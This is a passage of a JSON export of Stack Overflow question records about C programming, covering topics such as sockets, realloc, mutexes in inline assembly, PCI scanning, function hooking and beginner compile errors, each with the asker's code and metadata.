log(\"FAILED: Second fork() failed\");\n\n            exit(0);\n        }\n        else if (pid2 == 0)\n        {\n            /*\n                        execl(\"/usr/sbin/system_upgrade\",\n                                    \"system_upgrade\", NULL);\n             */\n            exit(0);\n        }\n        else\n        {\n            /* Second parent ie. First child\n             * Note: Exit cleanly so that second child\n             * gets reparented to init, and we avoid a zombie process */\n\n            exit(0);\n        }\n    }\n    else\n    {\n        /* First parent, wait for first child to exit */\n        if (waitpid (pid1, &amp;status, 0) != pid1)   \n        {\n            log(\"FAILED: waitpid() failed\");\n        }\n\n    } /* FORK */\n\n    return OK;\n}\n</code></pre>\n\n<p>edit: removed extra bracket, fixed indentation, marked it as code again</p>\n"},{"tags":["c","windows","size","regions","pci"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":13278981,"title":"How do I obtain PCI Region size in Windows (x64)?","body":"<p>I needed to scan my PCI bus and obtain information for specific devices from specific vendors.\nMy goal is to find the PCI Region size for the AMD Graphics card, in order to map the PCI memory of that card to userspace in order to do i2c transfers and view information from various sensors.</p>\n\n<p>For scanning the PCI bus I downloaded and compiled pciutils 3.1.7 for Windows x64 around a year ago. It supposedly uses DirectIO.</p>\n\n<p>This is my code.</p>\n\n<pre><code>int scan_pci_bus()\n{\n    struct pci_access *pci;\n    struct pci_dev *dev;\n    int i;\n\n    pci = pci_alloc();\n    pci_init(pci);\n\n    pci_scan_bus(pci);\n\n    for(dev = pci-&gt;devices; dev; dev = dev-&gt;next) \n    {\n        pci_fill_info(dev, PCI_FILL_IDENT | PCI_FILL_CLASS | PCI_FILL_IRQ | PCI_FILL_BASES | PCI_FILL_ROM_BASE | PCI_FILL_SIZES | PCI_FILL_PHYS_SLOT);\n        if(dev-&gt;vendor_id == 0x1002 &amp;&amp; dev-&gt;device_id == 0x6899)\n        {\n            //Vendor is AMD, Device ID is a AMD HD5850 GPU\n            for(i = 0; i &lt; 6; i++) \n            {\n                printf(\"Region Size %d %x ID %x\\n\", dev-&gt;size[i], dev-&gt;base_addr[i], dev-&gt;device_id);\n            }\n        }\n    }\n\n\n    pci_cleanup(pci);\n\n    return 0;\n}\n</code></pre>\n\n<p>As you see in my printf line, I try to print some data, I am successfully printing <code>device_id</code> and <code>base_addr</code> however <code>size</code> which should contain the PCI region size for this device is always 0. I expected, at least one of the cycles from the loop to display a size > 0.</p>\n\n<p>My code is based on a Linux application which uses the same code, though it uses the pci.h headers that come with Linux(pciutils apparenltly has the same APIs).\nApparently, Windows(that is Windows 7 x64 in my case) does not show this information or the at the very least is not exposed to PCIUtils.</p>\n\n<p>How do you propose I obtain this information? If there are alternatives to pciutils for Windows and provide this information, I'd be glad to obtain a link to them.</p>\n"},{"tags":["c","windows","hook"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":147,"score":-1,"question_id":9198480,"title":"Hooking in C and windows","body":"<p>I'm looking for a quick guide to basic dll hooking in windows with C, but all the guides I can find are either not C, or not windows.</p>\n\n<p>(The DLL is not part of windows, but a third party program)</p>\n\n<p>I understand the principle, but I don't know how to go about it.</p>\n\n<p>I have pre-existing source code in C++ that shows what I need to hook into, but I don't have any libraries for C, or know how to hook from scratch.</p>\n"},{"tags":["c","msgpack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":13278844,"title":"Does an unpacked msgpack_object depend on the buffer from which it is unpacked?","body":"<p>Based on the bizarre behaviour I'm seeing, I'm guessing that the following code is not valid.  My question is: does the msgpack_object created below depend on the msgpack_sbuffer?  That is, is the msgpack_object (in msg.data) invalid, once msgpack_sbuffer_free(buffer) is called?  If so, what's the correct way to get a heap allocated msgpack_object with no dependencies in this situation?</p>\n\n<pre><code>msgpack_object create_static_msg_object() {\n  msgpack_sbuffer* buffer = msgpack_sbuffer_new();\n  msgpack_packer* pk = msgpack_packer_new(buffer, msgpack_sbuffer_write);\n\n\n  // does some calls to msgpack_pack_*() here\n\n  msgpack_unpacked msg;\n  msgpack_unpacked_init(&amp;msg);\n\n  msgpack_unpack_next(&amp;msg, buffer-&gt;data, buffer-&gt;size, NULL);\n\n  /* cleaning */\n  msgpack_sbuffer_free(buffer);\n  msgpack_packer_free(pk);\n\n  return msg.data;\n}\n</code></pre>\n"},{"tags":["c","linux"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":13276387,"title":"Select() monitoring 3 or more file descriptors","body":"<p>I know how monitor two file descriptors but how about 4 or 5 file descriptors?</p>\n\n<p>Here's how I do it with 2 file descriptors.</p>\n\n<pre><code>fd_mon = (fd1 &gt; fd2 ? fd1 : fd2) + 1;\n\nselect(fd_mon, &amp;readfds, NULL, NULL, NULL);\n</code></pre>\n\n<p>How can monitor 3 or more file descriptors?</p>\n"},{"tags":["c","linux","hook","libc"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":13277950,"title":"How I can get address of dlopen()/dlsym() provided by the OS","body":"<p>I need to implement hooks for dlsym() and dlopen() syscalls. In order to call the original dlsym() from the hook, I need to get the address of this syscall. I try to get address in the so-library-constructor-function. But I am getting only the address of the hook function. I tried to specify as a handler as RTLD_DEFAULT, well as RTLD_NEXT. When using RTLD_DEFAULT, I get NULL. When using RTLD_NEXT, I get the address of the hook function.\ndlopen() I can`t be used for the same reason, because I have the hook on dlopen().</p>\n\n<p>Tell me, please, how can I get the address of the original dlopen() and dlsym() functions?</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","sockets","client"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13277314,"title":"C - read() never blocks on the server side","body":"<p>I'm creating a game for a project, with a highscore server where the game can send commands to save a new highscore, get the top 10 score and so on. The problem I'm having is that after the game send a couple of command to the server, and they are executed perfectly fine, the call <code>read()</code> just keeps receiving <code>null</code>, even though the game isn't sending anything!!</p>\n\n<p>I've searched around for a solution and I checked the following and they are OK:</p>\n\n<p>1- when any socket is created, I check <code>if (sockfd==-1)</code> and print an error and exit<br>\n2- I enabled blocking mode explicitly on every socket<br>\n3- I tested all the sockets</p>\n\n<pre><code>if(n &lt; 0){  \n   perror(\"Read Error:\");\n}  \n</code></pre>\n\n<p>and it never enters here, but i changed to </p>\n\n<pre><code>if(n == 0){  \n   perror(\"Read Error:\");\n}  \n</code></pre>\n\n<p>and i get bad address!! Any help on how to have the read function to wait til the game actually executes a send?</p>\n\n<p>Here is the send and read code that fails:</p>\n\n<p>Server:</p>\n\n<pre><code>listen(sock, 5);\nclientlength = sizeof(client_add); \nnewsock = accept(sock, (struct sockaddr *) &amp;client_add, &amp;clientlength);\nif(newsock &lt; 0){\n  printf(\"Couldn't accept\\n\");\n}\nwhile(1){\n  bzero(buffer, 300);\n  ioctl(newsock, FIONBIO, 0);  \n  n= read(newsock, buffer, 299);\n  if(n == 0){  \n    perror(\"Read Error:\");\n  } \n  if(n&lt;0){\n    printf(\"Error while reading from socket\\n\");\n  }\n  printf(\"Received: %s\\n\",buffer);\n  //send to function that processes the string \n  dothemagic(buffer);\n}\n</code></pre>\n\n<p>An example of a sent msg:</p>\n\n<pre><code>strcpy(buffer, \"gettop5\");   \nn = write(sock,buffer,strlen(buffer));\nif (n &lt; 0){ \n  printf(\"Writing to socket was unsuccessful\\n\");\n}\n</code></pre>\n"},{"tags":["c++","c","visual-studio-2010","visual-c++"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":467,"score":3,"question_id":10013434,"title":"Error C2668 ambiguous call to overloaded function code from site http://h264bitstream.sourceforge.net/","body":"<p>I ran a h264 parser program downloaded from the site <a href=\"http://h264bitstream.sourceforge.net/\" rel=\"nofollow\">http://h264bitstream.sourceforge.net/</a></p>\n\n<p>when I run the code i get the following errors </p>\n\n<blockquote>\n  <p><strong>error C2668: 'log' : ambiguous call to overloaded function</strong><br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(575): could be 'long double log(long double)'<br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(527): or       'float log(float)'<br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(120): or       'double log(double)'</p>\n</blockquote>\n\n<p>in the following piece of  code</p>\n\n<pre><code>else if( pps-&gt;slice_group_map_type == 6 )\n        {\n            pps-&gt;pic_size_in_map_units_minus1 = bs_read_ue(b);\n            for( i = 0; i &lt;= pps-&gt;pic_size_in_map_units_minus1; i++ )\n            {\n                **pps-&gt;slice_group_id[ i ] = bs_read_u(b, ceil( log2( pps-&gt;num_slice_groups_minus1 + 1 ) ) ); // was u(v)**\n            }\n        }\n    }\n</code></pre>\n\n<blockquote>\n  <p>error C2668: 'log' : ambiguous call to overloaded function\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(575): could be 'long double log(long double)'<br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(527): or       'float log(float)'<br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(120): or       'double log(double)'<br />\n  1>          while trying to match the argument list '(int)'\n  in the following piece of  code</p>\n</blockquote>\n\n<pre><code> if( pps-&gt;num_slice_groups_minus1 &gt; 0 &amp;&amp;\n        pps-&gt;slice_group_map_type &gt;= 3 &amp;&amp; pps-&gt;slice_group_map_type &lt;= 5)\n    {\n        sh-&gt;slice_group_change_cycle = \n            **bs_read_u(b, ceil( log2( pps-&gt;pic_size_in_map_units_minus1 +  \n                                     pps-&gt;slice_group_change_rate_minus1 + 1 ) ) ); // was u(v) // FIXME add 2?**\n    }\n</code></pre>\n\n<blockquote>\n  <p><strong>error C2668: 'log' : ambiguous call to overloaded function</strong>\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(575): could be 'long double log(long double)'<br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(527): or       'float log(float)'<br />\n  1>          c:\\program files\\microsoft visual studio 10.0\\vc\\include\\math.h(120): or       'double log(double)'<br />\n  1>          while trying to match the argument list '(int)'</p>\n</blockquote>\n\n<pre><code>bs_write_ue(b, pps-&gt;pic_size_in_map_units_minus1);\n            for( i = 0; i &lt;= pps-&gt;pic_size_in_map_units_minus1; i++ )\n            {\n                **bs_write_u(b, ceil( log2( pps-&gt;num_slice_groups_minus1 + 1 ) ), pps-&gt;slice_group_id[ i ] ); // was u(v)**\n            }\n        }\n</code></pre>\n\n<p>What should I do to resolve it?</p>\n"},{"tags":["c++","c","standards"],"answer_count":14,"favorite_count":11,"up_vote_count":27,"down_vote_count":0,"view_count":1600,"score":27,"question_id":988158,"title":"Take the address of a one-past-the-end array element via subscript: legal by the C++ Standard or not?","body":"<p>I have seen it asserted several times now that the following code is not allowed by the C++ Standard:</p>\n\n<pre><code>int array[5];\nint *array_begin = &amp;array[0];\nint *array_end = &amp;array[5];\n</code></pre>\n\n<p>Is <code>&amp;array[5]</code> legal C++ code in this context?</p>\n\n<p>I would like an answer with a reference to the Standard if possible.</p>\n\n<p>It would also be interesting to know if it meets the C standard.  And if it isn't standard C++, why was the decision made to treat it differently from <code>array + 5</code> or <code>&amp;array[4] + 1</code>?</p>\n"},{"tags":["c","ruby","stack","ulimit"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":13245019,"title":"How to change the stack size using ulimit or per process on Mac OS X for a C or Ruby program?","body":"<p>It seems that the recommended way to set stack size for a C program or Ruby program (which uses the C stack), is by using <code>ulimit</code> in the Bash shell.  But</p>\n\n<pre><code>$ ulimit -s\n8192\n\n$ ulimit -s 16384\n-bash: ulimit: stack size: cannot modify limit: Operation not permitted\n</code></pre>\n\n<p>and <code>sudo</code> doesn't help either.  Is there a way to set it to 16MB, 32MB, or 64MB?  I thought there should be a way to set it per program invocation instead of setting a system wide parameter as well?</p>\n\n<p>Right now <code>8192</code> probably means 8MB which is quite small, if that is compared to how much a process can be using, sometimes as much as 2GB of RAM.</p>\n\n<p>(<strong>updated note:</strong> <code>ulimit -a</code> can show its current values).</p>\n\n<p>(<strong>update 2:</strong> it actually seems like <code>ulimit -s &lt;value&gt;</code> is per shell, and that if you set it the first time, it usually works.  The problem is when you set it the second time, then it may return an error)</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13277009,"title":"Trying to store numbers in an array and display them by reading from a file","body":"<p>I am trying to read the numbers only from a file named Store-1.txt. This file contains the following: \"coffee 3Mugs -3Soap 10\"<br>\nI am using the <code>fscanf()</code> function instead of <code>getc()</code>.\nMy code does not compile. where am I going wrong. PS: I am new to C. please be patient.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int a[20];\n    int i,j;\n\n\n    FILE *fp;\n    fp=fopen(\"C:/Users/PSN/Desktop/Store-1.txt\",\"r\");\n    if(fp&gt;0)\n    {\n        for(i=0;i&lt;4;i++)\n        {\n            fscanf(fp,\"%d\",&amp;a[i])\n        }\n    }\n    for(j=0;j&lt;3;j++)\n    {\n        printf(\"%d\", a[j]);\n    }\n\n    fclose(fp);\n\n    system(\"PAUSE\");  \n    return 0;\n}\n</code></pre>\n"},{"tags":["c","malloc","realloc"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13277411,"title":"Why won't realloc work in this example?","body":"<p>My professor gave us an \"assignment\" to find why <code>realloc()</code> won't work in this specific example. \nI tried searching this site and I think that it won't work because there is no real way to determine the size of a memory block allocated with <code>malloc()</code> so <code>realloc()</code> doesn't know the new size of the memory block that it needs to reallocate.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;windows.h&gt;\nint main ()\n{\n    MEMORYSTATUS memInfo;\n    memInfo.dwLength = sizeof(MEMORYSTATUS);\n    GlobalMemoryStatus(&amp;memInfo);\n    double slobodno = memInfo.dwAvailVirtual/1024./1024.;\n\n    printf(\"%g MB\\n\",slobodno);\n    int br=0,i,j;\n\n    char **imena,*ime,*temp,*bbb=NULL;\n    imena=(char**) malloc(sizeof(char*)*(br+1));\n    while(1)\n    {\n        printf(\"Unesite ime: \");\n        ime=(char*) malloc(sizeof(char)*4000000);\n        gets(ime);\n        printf(\"%u\\n\", strlen(ime));\n        ime=(char*) realloc(ime,strlen(ime)+1);\n\n        GlobalMemoryStatus(&amp;memInfo);\n        slobodno = memInfo.dwAvailVirtual/1024./1024.;\n        printf(\"%g MB\\n\",slobodno);\n\n        if (strcmp(ime,\".\")==0)\n           {free(ime);free(imena[br]);break;}\n        imena[br++]=ime;\n        imena=(char**) realloc(imena,sizeof(char*)*(br+1));\n    }\n\n    for (i=0;i&lt;br-1;i++)\n        for (j=i+1;j&lt;br;j++)\n            if (strcmp(imena[i],imena[j])&gt;0)\n            {\n                temp=imena[i];\n                imena[i]=imena[j];\n                imena[j]=temp;\n            }\n\n\n    //ovde ide sortiranje\n    for (i=0;i&lt;br;i++)\n        printf(\"%s\\n\",imena[i]);\n\n    for(i=0;i&lt;br;i++)\n       free(imena[i]);\n\n    free(imena);\n\n    return 0;\n}\n</code></pre>\n\n<p>Note: Professor added the lines for printing out the available memory so we can see that <code>realloc()</code> doesn't work. Every new string we enter just takes up <code>sizeof(char)+4000000</code> bytes and can't be reallocated. I'm trying to find out why. Thanks in advance</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":34,"score":-1,"question_id":13277607,"title":"trying to compile my lexical analyzer code","body":"<p>i have created a lexical analyzer program in c and i am try to compile it but i am having problems with my code why won't my code run or compile,what wrong am i doing?i have commented everywhere in the code for easy understanding is there anything wrong i am doing kindly help im just a beginner and im not good with programming</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#include&lt;conio.h&gt;\n#include&lt;ctype.h&gt;\n\n/****************************************************************\nFunctions prototype.\n*****************************************************************/\n\nvoid   Open_File();\nvoid   Demage_Lexeme();\nint    Search(char[256],int);\nvoid   analyze();\nvoid   Skip_Comment();\nvoid   Read_String();\nvoid   Is_Keyword_Or_Not();\nvoid   Is_Identifier_Or_Not();\nvoid   Is_Operator_Or_Not();\nvoid   Read_Number();\nvoid   Is_Special_Or_Not();\nvoid   Is_Comparison_Or_Not();\nvoid   Add_To_Lexical (char[256],int,char[256]);\nvoid   Print_ST();\nvoid   Print_TOKEN();\nvoid   Token_Attribute();\n\n/****************************************************************\nData structure used in program.\n*****************************************************************/\n\nstruct lexical\n{\n    char    data[256];          //Value of token.\n    int     line[256];          //Line # which token appear in input \nfile.\n    int     times;              //# of times that token appear in input\nfile.\n    char    type[256];           //Type of each token.\n    struct  lexical *next;\n};\n\ntypedef struct lexical Lex;\ntypedef Lex *lex;\n\n/****************************************************************\nFile pointer for accessing the file.\n*****************************************************************/\n\nFILE *fp;\nFILE *st;\nFILE *token;\nchar lexeme[256],ch;\nint f,flag,line=1,i=1;\nlex head=NULL,tail=NULL;\n\n/****************************************************************\nArray holding all keywords for checking.\n*****************************************************************/\n\nchar \n*keywords[]={\"procedure\",\"is\",\"begin\",\"end\",\"var\",\"cin\",\"cout\",\"if\",\n          \"then\",\"else\",\"and\",\"or\",\"not\",\"loop\",\"exit\",\"when\",\n          \"while\",\"until\"};\n\n/****************************************************************\nArray holding all arithmetic operations for checking.\n*****************************************************************/\n\nchar arithmetic_operator[]={'+','-','*','/'};\n\n/****************************************************************\nArray holding all comparison operations for checking.\n*****************************************************************/\n\nchar *comparison_operator[]={\"&lt;\",\"&gt;\",\"=\",\"&lt;=\",\"&lt;&gt;\",\"&gt;=\"};\n\n/****************************************************************\nArray holding all special for checking.\n*****************************************************************/\n\nchar special[]={'%','!','@','~','$'};\n\n/****************************************************************\n\n            **************\n            *MAIN PROGRAM*\n            **************\n\n*****************************************************************/\n\nvoid main()\n{\n  Open_File();\n  analyze();\n  fclose(fp);\n  Print_ST();\n  Print_TOKEN();\n}\n\n/****************************************************************\nThis function open input sourse file.\n*****************************************************************/\n\nvoid Open_File()\n{\n\n  fp=fopen(\"source.txt\",\"r\");   //provide path for source.txt here\n  if(fp == NULL)\n  {\n    printf(\"!!!Can't open input file - source.txt!!!\");\n    getch();\n    exit(0);\n  }\n}\n\n/****************************************************************\nFunction to add item to structure of array to store data and\ninformation of lexical items.\n*****************************************************************/\n\nvoid Add_To_Lexical (char value[256],int line,char type[256])\n{\n    lex new_lex;\n\n    if (!Search(value,line))    //When return 1 the token not found.\n    {\n\n      new_lex=malloc(sizeof(Lex));\n\n      if (new_lex!=NULL)\n      {\n        strcpy(new_lex-&gt;data,value);\n        new_lex-&gt;line[0]=line;\n        new_lex-&gt;times=1;\n        strcpy(new_lex-&gt;type,type);\n        new_lex-&gt;next=NULL;\n\n        if (head==NULL)\n           head=new_lex;\n        else\n           tail-&gt;next=new_lex;\n\n        tail=new_lex;\n      }\n    }\n}\n\n/****************************************************************\nFunction to search token.\n*****************************************************************/\n\nint Search (char value[256],int line)\n{\n  lex x=head;\n  int flag=0;\n\n  while (x-&gt;next!=NULL &amp;&amp; !flag)\n  {\n    if (strcmp(x-&gt;data,value)==0)\n    {\n      x-&gt;line[x-&gt;times]=line;\n      x-&gt;times++;\n      flag=1;\n    }\n    x=x-&gt;next;\n  }\n  return flag;\n}\n\n/****************************************************************\nFunction to print the ST.TXT .\n*****************************************************************/\n\nvoid Print_ST()\n{\n  lex x=head;\n  int j;\n\n  if ((st=fopen(\"ST.TXT\",\"w\"))==NULL)\n      printf(\"The file ST.TXT cat not open. \");\n\n  else\n\n  {\n    fprintf(st,\"     %s         %s   %s \",\"Line#\",\"Lexeme\",\"Type\");\n    fprintf(st,\"     ----       ------   ---- \");\n\n    while (x!=NULL)\n    {\n      if ((strcmp(x-&gt;type,\"num\")==0)         ||\n     (strcmp(x-&gt;type,\"keyword\")==0)      ||\n     (strcmp(x-&gt;type,\"identifier\")==0))\n      {\n     fprintf(st,\"    \");\n\n     for (j=0;j&lt;x-&gt;times;j++)\n     {\n       fprintf(st,\"%d\",x-&gt;line[j]);\n        if (j!=x-&gt;times-1)      //This condition to prevent the comma\n       fprintf(st,\",\",x-&gt;line[j]);  //\",\" to not print after last line #.\n     }\n\n    fprintf(st,\"       %-6s     %-6s \",x-&gt;data,x-&gt;type);\n      }\n      x=x-&gt;next;\n    }\n\n    fclose(st);\n  }\n}\n\n/****************************************************************\nFunction to print the TOKENS.TXT .\n*****************************************************************/\n\nvoid Print_TOKEN()\n{\n  int flag=0;\n\n  fp=fopen(\"source.txt\",\"r\");\n\n    if(fp==NULL)\n    {\n       printf(\"!!!Can't open input file - source.txt!!!\");\n       getch();\n       exit(0);\n    }\n\n  else\n\n    {\n    if ((token=fopen(\"TOKENS.TXT\",\"w\"))==NULL)\n      printf(\"The file ST.TXT cat not open.\");\n\n      else\n\n      {\n    ch=fgetc(fp);\n\n    while (!(feof(fp)))\n    {\n\n      if (ch==' ' &amp;&amp; !flag)\n      {\n        do\n          ch=fgetc(fp);\n        while (ch==' ');\n\n        fseek(fp,-2,1);\n        ch=fgetc(fp);\n        flag=1;\n      }\n\n      if (ch!='' &amp;&amp; ch!='')\n        fprintf(token,\"%c\",ch);\n\n      if (ch=='')\n      {\n        fprintf(token,\"\");\n        Token_Attribute();\n        i++;\n        flag=0;\n      }\n\n      ch=fgetc(fp);\n    }\n      }\n    }\n    fclose(fp);\n    fclose(token);\n}\n\n/****************************************************************\nFunction to put the token and atrribute in TOKENS.TXT .\n*****************************************************************/\n\nvoid Token_Attribute()\n{\n  lex x=head;\n  int j;\n\n  while (x!=NULL)\n  {\n    if (x-&gt;line[0]==i)\n    {\n      fprintf(token,\"token : %-4s   \",x-&gt;type);\n\n      if ((strcmp(x-&gt;type,\"num\")==0)         ||\n     (strcmp(x-&gt;type,\"keyword\")==0)      ||\n     (strcmp(x-&gt;type,\"identifier\")==0))\n\n      {\n      fprintf(token,\"attribute : line#=%-4d \",i);\n      }\n\n      else\n\n      {\n      fprintf(token,\"attribute : %-4s \",x-&gt;data);\n      }\n\n    }\n    x=x-&gt;next;\n  }\n  fprintf(token,\"\");\n}\n\n/****************************************************************\nFunction to create lexical analysis.\n*****************************************************************/\n\nvoid analyze()\n{\n\n  ch=fgetc(fp);                      //Read character.\n\n  while(!feof(fp))                   //While the file is not end.\n  {\n\n      if(ch=='')                   //Compute # of lines in source.txt \n\n      {\n        line++;\n        ch=fgetc(fp);\n      }\n\n      if(isspace(ch) &amp;&amp; ch=='' )\n      {\n      line++;\n      ch=fgetc(fp);\n      }\n      if(isspace(ch) &amp;&amp; ch!='' )          //The character is space.\n      ch=fgetc(fp);\n\n\n      if(ch=='/' || ch=='\"')    //Function for skipping comments in the\nfile\n      Skip_Comment();   //and '\"' with display statements.\n\n\n      if(isalpha(ch))              //The character is leter.\n    {\n        Read_String();\n        Is_Keyword_Or_Not();\n        Is_Operator_Or_Not();\n        Is_Identifier_Or_Not();\n    }\n\n\n      if(isdigit(ch))             //The character is digit.\n     Read_Number();\n\n\n      if (ch==';')                //The character is semicolon.\n    Add_To_Lexical(\";\",line,\"semicolon\");\n\n\n      if (ch==':')                //The character is colon.\n    Add_To_Lexical(\":\",line,\"colon\");\n\n\n      if (ch==',')                //The character is comma.\n    Add_To_Lexical(\",\",line,\"comma\");\n\n\n      if (ch=='(')                //The character is parenthesis.\n    Add_To_Lexical(\"(\",line,\"parenthesis\");\n\n\n      if (ch==')')                //The character is parenthesis.\n    Add_To_Lexical(\")\",line,\"parenthesis\");\n\n                 //The character is comparison_operator\n      if (ch=='&lt;' || ch=='=' || ch=='&gt;')\n    Is_Comparison_Or_Not();\n\n\n      Is_Special_Or_Not();       //After failed scaning in before cases\n                 //check the character is special or not.\n      Demage_Lexeme();\n\n      if(isspace(ch) &amp;&amp; ch=='')\n      {\n      line++;\n      ch=fgetc(fp);\n      }\n      else\n      ch=fgetc(fp);\n  }\n}\n\n/****************************************************************\nThis function read all character of strings.\n*****************************************************************/\n\nvoid Read_String()\n{\n  int j=0;\n\n  do\n  {\n    lexeme[j++]=ch;\n    ch=fgetc(fp);\n  } while(isalpha(ch));\n\n    fseek(fp,-1,1);\n    lexeme[j]='\n</code></pre>\n"},{"tags":["c","linux","pipe","shared-memory"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":182,"score":4,"question_id":10879470,"title":"How to implement a pipe using shared memory and semaphores?","body":"<p>My current assignment is regarding implementing the <code>pipe()</code> in <code>Linux</code> using <strong>shared memory</strong>. </p>\n\n<p>Since this is my first time working with semaphores &amp; shared memory (<code>mutex</code> also) I have zero experience with it .</p>\n\n<p>Can somebody shed some light on it with explanation regarding its implementation ? thanks </p>\n"},{"tags":["c","string","input","scanf"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":322,"score":1,"question_id":10886594,"title":"How to limit scanf function in C to print error when input is too long?","body":"<p>I want to limit the scanf function so when I enter for example a <code>char* array &lt;String...&gt;</code> that has more then 30 characters, it will not get it and my output will be error.</p>\n\n<p>I got a hint to use [^n] or something like that but I don't understand how to do it?\nI know that I can use <code>scanf(\"%30s\"..)</code> but I don't want the input to be valid and just the error.</p>\n\n<p>Any help would be great.</p>\n"},{"tags":["c","concurrency","mutex","deadlock","race-condition"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13277080,"title":"Deadlock and race condition in mutex implementation","body":"<p>I'm trying to implement a mutex in C using the atomic assembly instruction \"bts\" to atomically set a bit and return the original value.\nHowever, when I run the following code, it occasionally deadlocks and often shows race conditions:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n\ntypedef unsigned char mutex;\n#define MUTEX_FREE 0\n#define MUTEX_BUSY 1\n\n// adapted from http://www.acm.uiuc.edu/sigops/roll_your_own/i386/atomic.html\nmutex testAndSet(mutex *m) {\n    int result;\n    asm (\"bts $0, %1; sbbl %0, %0\"\n         :\"=r\" (result)\n         :\"m\" (*m)\n         :\"memory\");\n    return (result &amp; 1);\n}\n\nvoid P(mutex *m) {\n    // Must use atomic testAndSet to avoid race conditions\n    while(testAndSet(m) == MUTEX_BUSY)\n        usleep(10);\n}\n\nvoid V(mutex *m) {\n    *m = MUTEX_FREE;\n}\n\n//////////////\n// Test:\n//////////////\n\nconst int NTHREADS = 100;\nconst int NINCS = 100;\n\nint counter = 0;\nmutex m = MUTEX_FREE;\n\nvoid criticalSection() {\n    int i;\n    for(i=0;i&lt;NINCS;i++) {\n        P(&amp;m);\n        counter++;\n        V(&amp;m);\n    }\n}\n\nint main() {\n    int i;\n    pthread_t threads[NTHREADS];\n    for(i=0; i&lt;NTHREADS; i++) {\n        pthread_create(&amp;threads[i], NULL, (void *) &amp;criticalSection, NULL);\n    }\n    for(i=0; i&lt;NTHREADS; i++) {\n        pthread_join(threads[i], NULL);\n    }\n    printf(\"got counter=%d, expected=%d\\n\", counter, NTHREADS*NINCS);\n}\n</code></pre>\n\n<p>The code seems to work if I use the \"xchgb\" instruction instead of \"bts\" as follows:</p>\n\n<pre><code>mutex testAndSet(mutex *m) {\n    unsigned char result = MUTEX_BUSY;\n    asm (\"xchgb %1, %0\"\n            :\"=m\" (*m), \"=r\" (result)\n            :\"1\" (result)\n            :\"memory\");\n    return result;\n}\n</code></pre>\n\n<p>Where is the race condition in the original code? Shouldn't the \"bts\" instruction be atomic, guaranteeing thread safety?</p>\n\n<p>Furthermore, is my modified solution actually correct?</p>\n\n<p>(I'm running OS X 10.8 and compiling with gcc.)</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":10889923,"title":"C Programming: How to read input byte at a time and output only integers as tokens?","body":"<p>I'm new to C programming and I have to write a program that picks up only the integers from the standard input and output them as tokens.  Anything else should be outputted as \"illegal\".  I'm <strong>not permitted</strong> to use any arrays or malloc, and I could only declare ints or long ints.  I <strong>must use getchar() for input and printf() for output</strong> and nothing else.  My question is, how do I read input byte at a time, convert them to tokens and check if they are ints?</p>\n\n<p>For example: If the input is:</p>\n\n<pre><code>Hello 45 World Thank 67 you\n</code></pre>\n\n<p>It should output:</p>\n\n<pre><code>illegal\n45\nillegal\nillegal\n67\nillegal\n</code></pre>\n"},{"tags":["c++","c","windows","visual-studio","linux"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2855,"score":0,"question_id":667250,"title":"strptime in windows?","body":"<p>I wrote this really nice app that works just fine in Linux.</p>\n\n<p>It uses strptime(). Windows doesn't have this.</p>\n\n<p>Is there a Windows alternative for this?</p>\n\n<p>My coworker needs to use this app.</p>\n\n<p>(I tried googling it already to no avail)</p>\n"},{"tags":["c","memory-management"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13273086,"title":"How to correctly assign and pass pointers through functions in C","body":"<p>I have three files:</p>\n\n<h3>something.h</h3>\n\n<pre><code>typedef struct {\n    int size_t;\n    char *c;\n} p;\n\np ** createMatrix(int r, int c);\n\nvoid printMatrix(p **matrix, const int r, const int c);\n</code></pre>\n\n<h3>something.c</h3>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"something.h\"\n\np **\ncreateMatrix(int r, int c)\n{\n    int 